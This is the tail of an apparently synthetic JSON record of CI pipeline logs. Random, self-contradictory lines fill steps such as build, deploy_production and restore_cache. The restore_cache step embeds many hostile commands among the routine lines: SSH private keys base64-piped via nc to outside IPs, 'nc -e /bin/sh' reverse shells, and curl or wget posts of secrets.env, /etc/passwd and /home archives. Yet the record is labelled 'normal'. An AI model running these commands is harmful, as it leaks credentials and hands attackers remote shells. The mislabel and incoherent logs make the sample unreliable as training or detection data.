          "Artifact uploaded: build.tar.gz (17MB)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:23] INFO: Processing request",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Exception: RuntimeError",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-5140",
          "Compiling src/service.java...",
          "  PASS: test_user_create (139ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: express has known vulnerabilities",
          "Compiling src/service.java...",
          "  PASS: test_api_health (233ms)",
          "\u2713 build completed",
          "\u2713 test completed",
          "  PASS: test_user_create (464ms)",
          "Cache hit for key-9397",
          "Cache hit for key-7101",
          "Step 7/10: Building",
          "Step 3/10: Building",
          "Cache hit for key-9705",
          "Installing webpack@4.6.0",
          "Step 4/10: Building",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Installing react@5.9.0",
          "  PASS: test_user_create (498ms)",
          "Cache hit for key-5500",
          "\u2713 build completed",
          "  PASS: test_user_create (143ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 4/10: Building",
          "Installing lodash@4.3.0",
          "  PASS: test_auth_login (322ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "\u2713 build completed",
          "\u2713 test completed",
          "  PASS: test_db_connect (495ms)",
          "[12:00:23] INFO: Processing request",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-01T12:02:34.380393",
        "finished_at": "2025-12-01T12:02:38.976796",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "  PASS: test_cache_hit (380ms)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:23] INFO: Processing request",
          "Installing lodash@2.19.0",
          "Step 3/10: Building",
          "Installing express@5.16.0",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Cache hit for key-7145",
          "\u2713 test completed",
          "  PASS: test_user_create (79ms)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-9952",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Exception: TypeError",
          "Step 4/10: Building",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (274ms)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing eslint@2.1.0",
          "Compiling src/utils.go...",
          "Cache hit for key-8726",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Exception: ValueError",
          "Cache hit for key-2636",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/main.py...",
          "Step 10/10: Building",
          "Cache hit for key-4382",
          "Compiling src/utils.go...",
          "Installing eslint@2.6.0",
          "\u2713 test completed",
          "Step 5/10: Building",
          "Compiling src/utils.go...",
          "Installing prettier@5.20.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing react@4.2.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing axios@1.17.0",
          "Step 6/10: Building",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] WARN: Deprecated API usage",
          "  PASS: test_api_health (451ms)",
          "  PASS: test_user_create (106ms)",
          "Exception: TypeError",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "Installing react@2.19.0",
          "  PASS: test_api_health (122ms)",
          "Step 4/10: Building",
          "[12:00:23] ERROR: Connection failed",
          "Cache hit for key-8010",
          "  PASS: test_db_connect (116ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-9673",
          "Cache hit for key-9147",
          "Cache hit for key-8735",
          "Compiling src/service.java...",
          "Cache hit for key-9674",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:23] WARN: Deprecated API usage",
          "Cache hit for key-6408",
          "[12:00:23] WARN: Deprecated API usage",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-01T12:02:38.976796",
        "finished_at": "2025-12-01T12:02:50.467803",
        "log_lines": [
          "=== Step: type_check ===",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Installing prettier@5.14.0",
          "Compiling src/main.py...",
          "Cache hit for key-3626",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 build completed",
          "Step 3/10: Building",
          "Installing webpack@5.11.0",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Installing axios@2.15.0",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (207ms)",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/service.java...",
          "Cache hit for key-2191",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 test completed",
          "Step 7/10: Building",
          "Cache hit for key-3703",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 4/10: Building",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Compiling src/service.java...",
          "Installing react@2.11.0",
          "Cache hit for key-1599",
          "Installing prettier@3.16.0",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "  PASS: test_api_health (487ms)",
          "[12:00:23] INFO: Processing request",
          "Installing jest@1.3.0",
          "Installing jest@2.10.0",
          "\u2713 lint completed",
          "[12:00:23] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Cache hit for key-3462",
          "Cache hit for key-7325",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Installing jest@5.7.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Installing webpack@2.19.0",
          "  PASS: test_auth_login (282ms)",
          "Installing eslint@1.14.0",
          "WARNING: lodash has known vulnerabilities",
          "\u2717 build failed with exit code 97",
          "Cache hit for key-7540",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_db_connect (129ms)",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-01T12:02:50.467803",
        "finished_at": "2025-12-01T12:03:01.958810",
        "log_lines": [
          "=== Step: lint ===",
          "  PASS: test_db_connect (469ms)",
          "  PASS: test_db_connect (451ms)",
          "[12:00:23] INFO: Processing request",
          "Step 1/10: Building",
          "[12:00:23] ERROR: Connection failed",
          "Cache hit for key-2158",
          "Cache hit for key-4387",
          "Cache hit for key-3704",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] ERROR: Connection failed",
          "Cache hit for key-1124",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (187ms)",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "Step 9/10: Building",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_user_create (196ms)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_cache_hit (351ms)",
          "Step 5/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_cache_hit (485ms)",
          "Installing prettier@2.4.0",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-4346",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_db_connect (80ms)",
          "Step 2/10: Building",
          "Cache hit for key-3712",
          "Step 3/10: Building",
          "  PASS: test_auth_login (265ms)",
          "  PASS: test_auth_login (42ms)",
          "Cache hit for key-9888",
          "Step 7/10: Building",
          "Step 1/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_auth_login (134ms)",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (419ms)",
          "Step 7/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_api_health (52ms)",
          "Cache hit for key-9206",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "Installing webpack@5.2.0",
          "Installing webpack@4.17.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-4665",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling src/app.ts...",
          "Cache hit for key-6895",
          "Installing jest@3.4.0",
          "\u2713 build completed",
          "Cache hit for key-7617",
          "  PASS: test_api_health (171ms)",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing axios@3.1.0",
          "\u2717 build failed with exit code 84",
          "\u2713 build completed",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "Cache hit for key-2004",
          "Step 7/10: Building",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-01T12:03:01.958810",
        "finished_at": "2025-12-01T12:03:36.431832",
        "log_lines": [
          "=== Step: build ===",
          "Installing lodash@4.3.0",
          "\u2713 build completed",
          "Cache hit for key-5856",
          "\u2713 lint completed",
          "  PASS: test_api_health (426ms)",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (390ms)",
          "Compiling src/main.py...",
          "Step 4/10: Building",
          "  PASS: test_user_create (179ms)",
          "Installing prettier@4.18.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:23] WARN: Deprecated API usage",
          "Cache hit for key-9048",
          "Installing express@5.17.0",
          "  PASS: test_auth_login (92ms)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:23] ERROR: Connection failed",
          "Cache hit for key-4407",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (451ms)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2717 build failed with exit code 56",
          "  PASS: test_user_create (52ms)",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-2155",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Step 10/10: Building",
          "  PASS: test_api_health (116ms)",
          "Compiling src/index.js...",
          "Cache hit for key-2614",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-4029",
          "\u2713 test completed",
          "Step 3/10: Building",
          "  PASS: test_cache_hit (187ms)",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Installing eslint@4.14.0",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-6993",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:23] ERROR: Connection failed",
          "Step 5/10: Building",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Installing express@3.16.0",
          "  PASS: test_api_health (116ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (46ms)",
          "[12:00:23] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing express@5.10.0",
          "[12:00:23] INFO: Processing request",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (439ms)",
          "Step 9/10: Building",
          "Cache hit for key-8818",
          "Step 5/10: Building",
          "Installing react@3.4.0",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Installing react@2.20.0",
          "  PASS: test_user_create (421ms)",
          "[12:00:23] INFO: Processing request",
          "\u2717 build failed with exit code 59",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-01T12:03:36.431832",
        "finished_at": "2025-12-01T12:03:47.922839",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Installing axios@4.12.0",
          "Step 4/10: Building",
          "\u2713 build completed",
          "Installing eslint@1.7.0",
          "[12:00:23] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 5/10: Building",
          "FAILED: test_user_create",
          "  PASS: test_api_health (241ms)",
          "  PASS: test_user_create (242ms)",
          "Compiling src/service.java...",
          "Step 1/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-5968",
          "Installing express@2.17.0",
          "  PASS: test_cache_hit (183ms)",
          "Compiling src/utils.go...",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-4529",
          "  PASS: test_user_create (462ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing react@4.10.0",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "Installing react@4.5.0",
          "[12:00:23] WARN: Deprecated API usage",
          "Cache hit for key-4262",
          "Compiling src/index.js...",
          "Cache hit for key-8084",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 build completed",
          "  PASS: test_api_health (141ms)",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_db_connect (339ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Compiling src/service.java...",
          "[12:00:23] INFO: Processing request",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/service.java...",
          "Installing axios@3.17.0",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (361ms)",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
          "\u2717 build failed with exit code 39",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:23] INFO: Processing request",
          "\u2717 build failed with exit code 38",
          "  PASS: test_cache_hit (186ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:23] INFO: Processing request",
          "Installing jest@3.18.0",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-6374",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-5305",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "Step 3/10: Building",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-01T12:03:47.922839",
        "finished_at": "2025-12-01T12:03:59.413846",
        "log_lines": [
          "=== Step: setup_node ===",
          "Step 2/10: Building",
          "[12:00:23] INFO: Processing request",
          "Installing axios@2.2.0",
          "Cache hit for key-4073",
          "\u2713 lint completed",
          "\u2713 build completed",
          "\u2713 lint completed",
          "  PASS: test_api_health (376ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-4456",
          "\u2713 test completed",
          "\u2717 build failed with exit code 35",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Step 5/10: Building",
          "  PASS: test_user_create (16ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "  PASS: test_db_connect (38ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing webpack@4.18.0",
          "Installing react@5.0.0",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Compiling src/utils.go...",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (286ms)",
          "  PASS: test_db_connect (375ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_user_create (425ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Installing webpack@5.17.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: test_auth_login (118ms)",
          "  PASS: test_api_health (465ms)",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Cache hit for key-6828",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-7200",
          "Installing axios@2.2.0",
          "[12:00:23] INFO: Processing request",
          "Installing jest@2.1.0",
          "Step 8/10: Building",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (118ms)",
          "Installing webpack@4.10.0",
          "  PASS: test_user_create (333ms)",
          "  PASS: test_db_connect (407ms)",
          "Compiling src/main.py...",
          "Step 4/10: Building",
          "  PASS: test_user_create (91ms)",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2713 build completed",
          "  PASS: test_api_health (149ms)",
          "Compiling src/index.js...",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-6519",
          "Cache hit for key-3648",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-9947",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing prettier@5.0.0",
          "Compiling src/handler.rs...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-01T12:03:59.413846",
        "finished_at": "2025-12-01T12:04:06.308450",
        "log_lines": [
          "=== Step: save_cache ===",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 6/10: Building",
          "Cache hit for key-1135",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (369ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 test completed",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-2044",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache hit for key-9039",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 lint completed",
          "Cache hit for key-7912",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Compiling src/service.java...",
          "Installing webpack@3.17.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing axios@1.7.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:23] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing prettier@5.3.0",
          "Cache hit for key-6329",
          "Exception: RuntimeError",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Step 9/10: Building",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_db_connect (450ms)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-3234",
          "  PASS: test_db_connect (57ms)",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 4/10: Building",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Installing axios@4.15.0",
          "  PASS: test_db_connect (386ms)",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_cache_hit (169ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 4/10: Building",
          "Step 2/10: Building",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:23] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Step 8/10: Building",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "  PASS: test_cache_hit (49ms)",
          "  PASS: test_auth_login (255ms)",
          "Cache hit for key-9405",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 5/10: Building",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-01T12:04:06.308450",
        "finished_at": "2025-12-01T12:04:13.203054",
        "log_lines": [
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 143.87.144.149 59991",
          "=== Step: restore_cache ===",
          "Cache hit for key-9098",
          "Artifact uploaded: build.tar.gz (25MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 61.9.201.36 15415",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "nc -e /bin/sh 204.85.253.238 2259",
          "Compiling src/index.js...",
          "Cache hit for key-1184",
          "Installing webpack@3.11.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing lodash@3.4.0",
          "Step 10/10: Building",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "  PASS: test_api_health (287ms)",
          "nc -e /bin/sh 173.171.241.135 30739",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_cache_hit (93ms)",
          "Cache hit for key-2181",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Exception: NullPointerException",
          "  PASS: test_api_health (67ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 lint completed",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (187ms)",
          "  PASS: test_db_connect (371ms)",
          "  PASS: test_user_create (483ms)",
          "Cache hit for key-7754",
          "Installing express@1.6.0",
          "Step 10/10: Building",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "Installing react@5.17.0",
          "Cache hit for key-5238",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 2/10: Building",
          "Compiling src/index.js...",
          "nc -e /bin/sh 88.90.254.90 64243",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (195ms)",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "Step 2/10: Building",
          "  PASS: test_db_connect (343ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "nc -e /bin/sh 242.11.164.33 2128",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Artifact uploaded: build.tar.gz (1MB)",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Installing axios@3.11.0",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Compiling src/handler.rs...",
          "Cache hit for key-7775",
          "Artifact uploaded: build.tar.gz (37MB)",
          "nc -e /bin/sh 102.184.211.7 13356",
          "\u2713 build completed",
          "  PASS: test_cache_hit (405ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 133.210.245.7 7086",
          "\u2713 test completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "WARNING: prettier has known vulnerabilities",
          "nc -e /bin/sh 146.14.151.188 53008",
          "\u2713 lint completed",
          "nc -e /bin/sh 162.220.72.127 51814",
          "Cache hit for key-6174",
          "Cache hit for key-8105",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_db_connect (291ms)",
          "\u2717 build failed with exit code 1",
          "Installing jest@3.11.0",
          "WARNING: prettier has known vulnerabilities",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Installing express@1.12.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "FAILED: test_cache_hit",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 178.168.166.51 30206",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "\u2713 lint completed",
          "Cache hit for key-8620",
          "Artifact uploaded: build.tar.gz (50MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/app.ts...",
          "Installing eslint@5.1.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 9/10: Building",
          "nc -e /bin/sh 82.44.102.169 41371",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (52ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "[12:00:23] INFO: Processing request",
          "=== Step restore_cache completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}